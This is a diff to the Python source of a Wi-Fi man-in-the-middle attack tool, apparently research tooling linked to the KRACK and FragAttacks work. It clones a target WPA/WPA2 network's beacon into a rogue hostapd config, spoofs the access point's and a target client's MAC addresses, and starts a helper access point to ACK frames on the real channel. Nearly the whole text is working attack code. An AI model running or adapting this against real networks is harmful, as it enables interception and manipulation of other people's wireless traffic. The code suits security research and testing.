@@ -90,6 +90,40 @@ import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, selec
 from datetime import datetime
 from wpaspy import Ctrl
 
+def set_monitor_active(iface):
+	return False
+	try:
+		subprocess.check_output(["iw", iface, "set", "monitor", "active"])
+		return True
+	except CalledProcessError:
+		return False
+
+
+#FIXME: We don't need this anymore. We can use "set __ap", client mode.
+#TODO: And "set active" doesn't work with hwsim anyway...
+def set_monitor_active_fake_ap(iface, macaddr, channel):
+	iface_ack = iface + "ack"
+	subprocess.check_output(["iw", iface, "interface", "add", iface_ack, "type", "managed"])
+	time.sleep(0.3)
+	set_macaddress(iface_ack, macaddr)
+
+	config = f"""
+interface={iface_ack}
+driver=nl80211
+ssid={iface_ack}
+channel={channel}
+beacon_int=10000
+ignore_broadcast_ssid=1
+"""
+
+	with open("hostapd_ack.conf", "w") as fp:
+		fp.write(config)
+
+	cmd = ["../hostapd/hostapd", "hostapd_ack.conf"]
+	log(STATUS, "Starting hostapd to ACK frames: " + " ".join(cmd))
+	return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+
 #### Packet Processing Functions ####
 
 def get_eapol_msgnum(p):
@@ -213,6 +247,7 @@ class NetworkConfig():
 	not replicated, since they won't be verified by WPA2 devices anyway.
 	"""
 	def __init__(self):
+		self.beacon = None
 		self.ssid = None
 		self.real_channel = None
 		self.group_cipher = None
@@ -248,7 +283,7 @@ class NetworkConfig():
 			self.capab = struct.unpack("<H", pos[:2])[0]
 
 
-	def from_beacon(self, p):
+	def parse_beacon(self, p):
 		el = p[Dot11Elt]
 		while isinstance(el, Dot11Elt):
 			if el.ID == IEEE_TLV_TYPE_SSID:
@@ -267,6 +302,8 @@ class NetworkConfig():
 
 			el = el.payload
 
+		self.beacon = p
+
 
 	# TODO: Check that there also isn't a real AP of this network on 
 	# the returned channel (possible for large networks e.g. eduroam).
@@ -274,46 +311,37 @@ class NetworkConfig():
 		self.rogue_channel = 1 if self.real_channel >= 6 else 11
 
 
-	def write_config(self, iface):
-		TEMPLATE = """
+	def write_config(self, iface, copy_beacon=True):
+		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
+		ciphers2str = {2: "TKIP", 4: "CCMP"}
+
+		akms = " ".join([akm2str[idx] for idx in self.akms])
+		pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers])
+
+		config = f"""
 ctrl_interface=hostapd_ctrl
 ctrl_interface_group=0
 
 interface={iface}
-ssid={ssid}
-channel={channel}
+ssid={self.ssid}
+channel={self.rogue_channel}
 
-wpa={wpaver}
+wpa={self.wpavers}
 wpa_key_mgmt={akms}
 wpa_pairwise={pairwise}
 rsn_pairwise={pairwise}
-rsn_ptksa_counters={ptksa_counters}
-rsn_gtksa_counters={gtksa_counters}
+rsn_ptksa_counters={(self.capab & 0b001100) >> 2}
+rsn_gtksa_counters={(self.capab & 0b110000) >> 4}
 
-wmm_enabled={wmmenabled}
-wmm_advertised={wmmadvertised}
+wmm_enabled={self.wmmenabled}
+wmm_advertised=1
 hw_mode=g
 auth_algs=3
-wpa_passphrase=XXXXXXXX"""
-		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
-		ciphers2str = {2: "TKIP", 4: "CCMP"}
-		return TEMPLATE.format(
-			iface = iface,
-			ssid = self.ssid,
-			channel = self.rogue_channel,
-			wpaver = self.wpavers,
-			akms = " ".join([akm2str[idx] for idx in self.akms]),
-			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
-			#TODO: Also replicate management frame support
-			ptksa_counters = (self.capab & 0b001100) >> 2,
-			gtksa_counters = (self.capab & 0b110000) >> 4,
-			# Note that for an attacker it can be interesting to manipulate 802.11e support:
-			# - For the KRACK attack we pretended that the AP didn't support 11e to avoid
-			#   per-QoS replay counters. This made things a bit easier.
-			# - For the FragAttacks it was essential that 802.11e support was advertised such
-			#   that the client will request it causing the original AP to send QoS frames.
-			wmmadvertised = 1,
-			wmmenabled = self.wmmenabled)
+wpa_passphrase=XXXXXXXX
+"""
+		if copy_beacon:
+			config += f"\nmitm_beacon={raw(self.beacon).hex()}"
+		return config
 
 
 class ClientState():
@@ -407,6 +435,7 @@ class McMitm():
 		self.beacon = None
 		self.apmac = None
 		self.netconfig = None
+		self.hostapd_ack = None
 		self.hostapd = None
 		self.hostapd_log = None
 		self.low_output = low_output
@@ -544,9 +573,10 @@ class McMitm():
 				self.add_client(client)
 
 			# Let hostapd process association request to save connection parameters
-			elif Dot11AssoReq in p:
-				if p.addr2 in self.clients:
-					self.hostapd_rx_mgmt(p)
+			# FIXME: Do this *aftwards* so there won't be a timeout...........
+			#elif Dot11AssoReq in p:
+			#	if p.addr2 in self.clients:
+			#		self.hostapd_rx_mgmt(p)
 
 			# Clients sending a deauthentication or disassociation to the real AP are also interesting. Always
 			# display those and remove corresponding client entries.
@@ -675,8 +705,9 @@ class McMitm():
 				self.last_print_realchan = self.display_client_traffic(p, "Rogue channel", self.last_print_realchan)
 
 			# Let hostapd process association request to save connection parameters
-			if Dot11AssoReq in p:
-				self.hostapd_rx_mgmt(p)
+			# FIXME: Do this *aftwards* so there won't be a timeout...........
+			#if Dot11AssoReq in p:
+			#	self.hostapd_rx_mgmt(p)
 
 			# If this now belongs to a client we want to track, process the packet further
 			if client is not None and will_forward:
@@ -725,7 +756,7 @@ class McMitm():
 		log(STATUS, "Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect")
 
 		# 1. Remove unused virtual interfaces
-		subprocess.call(["iw", self.nic_real + "sta1", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+		subprocess.call(["iw", self.nic_real + "ack", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
 		if self.nic_rogue_mon is None:
 			subprocess.call(["iw", self.nic_rogue_ap + "mon", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
 
@@ -736,18 +767,7 @@ class McMitm():
 			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "monitor"])
 			set_monitor_mode(self.nic_rogue_mon, up=False, mtu=2000)
 
-		# 3. Configure interface on real channel to ACK frames
-		if self.clientmac:
-				self.nic_real_clientack = self.nic_real + "sta1"
-				subprocess.check_output(["iw", self.nic_real, "interface", "add", self.nic_real_clientack, "type", "managed"])
-				time.sleep(0.3)
-				set_macaddress(self.nic_real_clientack, self.clientmac)
-				subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
-		else:
-			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
-			log(WARNING, "WARNING: Targeting ALL clients is not fully supported! Please provide a specific target using --target.")
-
-		# 4. Finally put the interfaces up
+		# 3. Finally put the interfaces up
 		subprocess.check_output(["rfkill", "unblock", "wifi"])
 		subprocess.check_output(["ifconfig", self.nic_real, "up"])
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
@@ -770,7 +790,7 @@ class McMitm():
 		log(STATUS, f"Monitor mode: using {self.nic_real} on real channel and {self.nic_rogue_mon} on rogue channel.")
 
 		# Test monitor mode and get MAC address of the network
-		if self.nic_real_clientack: subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
+		# FIXME: Add an option to find the network based on the MAC address of the network
 		self.beacon = find_network(self.nic_real, self.ssid, opened_socket=self.sock_real)
 		if self.beacon is None:
 			log(ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
@@ -778,8 +798,9 @@ class McMitm():
 		self.apmac = self.beacon.addr2
 
 		# Parse beacon and used this to generate a cloned hostapd_rogue.conf
+		# FIXME: Add a second option so we can give the raw beacon to hostapd and don't have to worry about parsing the beacon
 		self.netconfig = NetworkConfig()
-		self.netconfig.from_beacon(self.beacon)
+		self.netconfig.parse_beacon(self.beacon)
 		if not self.netconfig.is_wparsn():
 			log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
 			return
@@ -794,8 +815,13 @@ class McMitm():
 		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
 		set_macaddress(self.nic_rogue_ap, self.apmac)
 
-		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
-		if self.nic_real_clientack: subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
+		# Now that we know the channel of the AP, but the monitor mode in active ACK mode (might start hostapd)
+		if self.clientmac:
+			if not set_monitor_active(self.nic_real):
+				self.hostapd_ack = set_monitor_active_fake_ap(self.nic_real, self.clientmac, self.netconfig.real_channel)
+		else:
+			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
+			log(WARNING, "WARNING: Targeting ALL clients is not fully supported! Please provide a specific target using --target.")
 
 		# Set BFP filters to increase performance
 		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
@@ -808,7 +834,9 @@ class McMitm():
 		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open("hostapd_rogue.conf", "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		cmd = ["../hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"]
+		log(STATUS, "Starting rogue hostapd using: " + " ".join(cmd))
+		self.hostapd = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
@@ -856,6 +884,9 @@ class McMitm():
 
 	def stop(self):
 		log(STATUS, "Closing hostapd and cleaning up ...")
+		if self.hostapd_ack:
+			self.hostapd_ack.terminate()
+			self.hostapd_ack.wait()
 		if self.hostapd:
 			self.hostapd.terminate()
 			self.hostapd.wait()
